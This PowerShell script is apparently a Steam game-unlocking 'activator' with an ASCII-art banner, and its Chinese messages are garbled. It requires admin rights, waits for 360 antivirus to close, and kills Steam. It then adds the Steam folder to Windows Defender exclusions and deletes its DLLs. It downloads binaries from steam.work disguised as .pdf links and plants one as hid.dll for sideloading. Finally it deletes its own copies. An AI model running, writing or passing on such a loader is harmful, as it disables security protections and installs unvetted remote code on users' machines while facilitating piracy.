cls
Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue

$filePathToDelete = Join-Path $env:USERPROFILE "x.ps1"
 if (Test-Path $filePathToDelete) {
    Remove-Item -Path $filePathToDelete
}
$desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "x.ps1"
if (Test-Path $desktopFilePathToDelete) {
    Remove-Item -Path $desktopFilePathToDelete
}

$steamRegPath = 'HKCU:\Software\Valve\Steam'
$localPath = -join ($env:LOCALAPPDATA,"\SteamActive")
if ((Test-Path $steamRegPath)) {
    $properties = Get-ItemProperty -Path $steamRegPath
    if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
        $steamPath = $properties.SteamPath
    }
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[�����´�Power shell �򿪷�ʽ�Թ���Ա�������]" -ForegroundColor:red
    exit
}

function PwStart() {
    if(Get-Process "360Tray*" -ErrorAction Stop){
        while(Get-Process 360Tray* -ErrorAction Stop){
            Write-Host "[�����˳�360��ȫ��ʿ]" -ForegroundColor:Red
            Start-Sleep 1.5
        }
        PwStart

    }
    if(Get-Process "360sd*" -ErrorAction Stop)
    {
        while(Get-Process 360sd* -ErrorAction Stop){
            Write-Host "[�����˳�360ɱ��]" -ForegroundColor:Red
            Start-Sleep 1.5
        }
        PwStart
    }

    if ($steamPath -eq ""){
        Write-Host "[��������Steam�Ƿ���ȷ��װ]" -ForegroundColor:Red
        exit
    }
    Write-Host "[ServerStart        OK]" -ForegroundColor:green
    Stop-Process -Name steam* -Force -ErrorAction Stop
    Start-Sleep 2
    if(Get-Process steam* -ErrorAction Stop){
        TASKKILL /F /IM "steam.exe" | Out-Null
        Start-Sleep 2
    }

    if (!(Test-Path $localPath)) {
        md $localPath | Out-Null
        if (!(Test-Path $localPath)) {
            New-Item $localPath -ItemType directory -Force | Out-Null
        }
    }

    $catchPath = -join ($steamPath,"\package\data")
    if ((Test-Path $catchPath)) {
        if ((Test-Path $catchPath)) {
            Remove-Item $catchPath -Recurse -Force | Out-Null
        }
    }

    try{
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
        Start-Sleep 3
    }catch{}

    Write-Host "[Result->0          OK]" -ForegroundColor:green

    try{
        $d = $steamPath + "/version.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #����ļ�
        }
        $d = $steamPath + "/user32.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #����ļ�
        }
        $d = $steamPath + "/steam.cfg"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #����ļ�
        }
        $d = $steamPath + "/hid.dll"
        if (Test-Path $d) {
            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #����ļ�
        }
    }catch{
        Write-Host "[�쳣��������[$d]�ļ��Ƿ��쳣!]" -ForegroundColor:red
        exit
    }

    $downloadData = "http://steam.work/pwsDwFile/bcfc1e52ca77ad82122dfe4c9560f3ec.pdf"
    $downloadLink = "http://steam.work/pwsDwFile/9b96dac2bb0ba18d56068fabc5b17185.pdf"
    
    irm -Uri $downloadLink -OutFile $d -ErrorAction Stop
    Write-Host "[Result->1          OK]" -ForegroundColor:green
    $d = $localPath + "/hid"
    irm -Uri $downloadData -OutFile $d -ErrorAction Stop
    Write-Host "[Result->2          OK]" -ForegroundColor:green
    
    Start-Sleep 1

    Start steam://
    Write-Host "[���ӷ������ɹ�����Steam���뼤���� 3����Զ��ر�]" -ForegroundColor:green
    Start-Sleep 3
    exit

}

PwStart